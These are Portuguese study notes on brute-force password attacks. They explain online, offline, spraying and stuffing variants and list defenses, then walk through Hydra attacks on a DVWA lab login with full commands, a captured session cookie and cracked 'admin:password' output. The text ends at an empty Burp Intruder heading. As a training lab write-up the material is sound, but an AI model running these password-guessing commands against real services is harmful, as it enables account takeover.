# Força Bruta

Tentativa sistemática de **adivinhar credenciais ou chaves** testando muitas combinações até encontrar a correta. Não explora uma falha de software; explora **senhas fracas**, **políticas frouxas** e **ausência de controles**.

### Principais formas

* **Online brute force**: tentativas diretas no serviço (SSH, HTTP login, RDP…). É limitado por **lockout**, **rate-limit** e rede. (Ferramentas típicas: Hydra, Medusa.)
* **Offline brute force**: tenta contra **hashes** de senhas previamente obtidos (dump, vazamento). Muito mais rápido, especialmente com **GPU** (hashcat/John). O sucesso depende do algoritmo de hash e da força da senha.
* **Dictionary / Hybrid**: testa listas de senhas comuns e variações (ex.: “Empresa2025!”, “Nome123”).
* **Password spraying**: mesma senha comum em **várias contas** (evita bloquear uma única conta).
* **Credential stuffing**: reutiliza **pares usuário:senha vazados** em outros sites.

### Por que funciona

* Senhas previsíveis, curtas ou reutilizadas.
* Hashes rápidos sem proteção (ex.: SHA-1/SHA-256 puro, sem **salt** e sem fator de custo).

### Sinais e riscos

* Muitas tentativas falhas, picos de autenticação, logins de IPs/dispositivos atípicos.
* Risco de **tomada de conta**, escalada interna, fraudes e vazamento de dados.

### Defesas essenciais

1. **MFA** (TOTP/chaves FIDO2) — quebra o valor de um único segredo.
2. **Política de senha forte** + **bloqueio progressivo** / **rate limiting** / **backoff**.
3. **Detecção & resposta**: alertas por IP/ASN, device fingerprint, geolocalização, UEBA.
4. **Proteja o armazenamento**: use **bcrypt/scrypt/Argon2** com **salt único** e **custo** ajustado; nunca SHA/MD5 puro para senhas.
5. **Passkeys/WebAuthn** onde possível (elimina senha).
6. **Higiene de credenciais**: proibir senhas já vazadas (ex.: listas de “pwned passwords”).
7. **CAPTCHA** ajuda contra bots simples, mas **não substitui** MFA e rate-limit.
8. **Segregar superfícies**: limitar tentativas em interfaces expostas (VPN/SSO), proteger admin com IP allowlist.

---
## Hydra

### Ataque a página inicial do DVWA (Login)

Inspecionando a página...
```
<form action="login.php" method="post">	
	<fieldset>
			<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />		
			<p class="submit"><input type="submit" value="Login" name="Login"></p>
	</fieldset>
	</form>
```
...observamos que as informações são passadas por um formulário através dos campos username e password, e submetidas pelo botão Login.

O **comando padrão hydra** para o ataque **http-form-post** é:
```
$ hydra L <LISTA_DE_USERNAMES> -P <LISTA_DE_SENHAS> <IP> http-form-post "<PATH_ARCHIVE>:<CAMPO_USER>=^USER^&<CAMPO_SENHA>=^PASS^&<NOME_BOTÃO>=submit:<AVISO_DE_FALHA>" -
```
* Utilizaremos arquivos de usernames e passwords pequenos para fins de velocidade na execução do exercício.
```
$ hydra 192.168.1.33 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -L usernames.txt -P passwords.txt

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-03 17:10:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 56 login tries (l:8/p:7), ~4 tries per task
[DATA] attacking http-post-form://192.168.1.33:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed
[80][http-post-form] host: 192.168.1.33   login: admin   password: password
[80][http-post-form] host: 192.168.1.33   login: Admin   password: password
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-03 17:10:55
```
O Hydra achou dois logins válidos (a partir da lista).

### Ataque a página /dvwa/vulnerabilities/brute/ 

Inspencionando a página...
```
	<form action="#" method="GET">
			Username:<br><input type="text" name="username"><br>
			Password:<br><input type="password" AUTOCOMPLETE="off" name="password"><br>
			<input type="submit" value="Login" name="Login">
		</form>
```
...observamos que é praticamente igual a anterior, trocando:
* O método para GET
* O aviso de erro
Contudo, executando o comando com as modificações...
```
$ hydra 192.168.1.33 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=submit:Username and/or password incorrect." -L usernames.txt -P passwords.txt
```
... todas as tentativas retornam como sucesso, indicando que algo falta ou não está correto no comando.

Usando o Burp Suite para verificar o fluxo, observamos que existe um cookie de sessão.
```
GET /dvwa/vulnerabilities/brute/?username=ccwdcqwd&password=cwdqqw&Login=Login HTTP/1.1
Host: 192.168.1.33
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.33/dvwa/vulnerabilities/brute/
Accept-Encoding: gzip, deflate, br
Cookie: security=high; security=low; PHPSESSID=ae49c4cec2fe60067eddfe55ea9e2824
Connection: keep-alive
```
Assim, é necessário incluir o cookie de sessão no comando hydra. O **comando padrão** para o ataque **http-form-get** com **cookie** é:
```
$ hydra L <LISTA_DE_USERNAMES> -P <LISTA_DE_SENHAS> <IP> http-form-post "<PATH_ARCHIVE>:<CAMPO_USER>=^USER^&<CAMPO_SENHA>=^PASS^&<NOME_BOTÃO>=submit:H=Cookie\:PHPSESSID=<COOKIE>:<AVISO_DE_FALHA>" -
```
* **Todos os dois pontos (:) que não forem separadores de opções devem ser escapados por uma barra invertida (\)**.
 * Se você for usar dois pontos (:) nos seus cabeçalhos, use uma barra invertida (\) como escape.

Executando o comando hydra:
```
$ hydra -L usernames.txt -P passwords.txt 192.168.1.33 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=ae49c4cec2fe60067eddfe55ea9e2824:Username and/or password incorrect."

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-03 20:56:02
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 56 login tries (l:8/p:7), ~4 tries per task
[DATA] attacking http-get-form://192.168.1.33:80/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=ae49c4cec2fe60067eddfe55ea9e2824:Username and/or password incorrect.
[80][http-get-form] host: 192.168.1.33   login: Admin   password: password
[80][http-get-form] host: 192.168.1.33   login: admin   password: password
[STATUS] 37.00 tries/min, 37 tries in 00:01h, 19 to do in 00:01h, 16 active
[STATUS] 28.00 tries/min, 56 tries in 00:02h, 1 to do in 00:01h, 15 active
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-03 20:58:47
```
O comando é executado com sucesso, como dois resultados positivos.

---

## Burp Suite Intruder


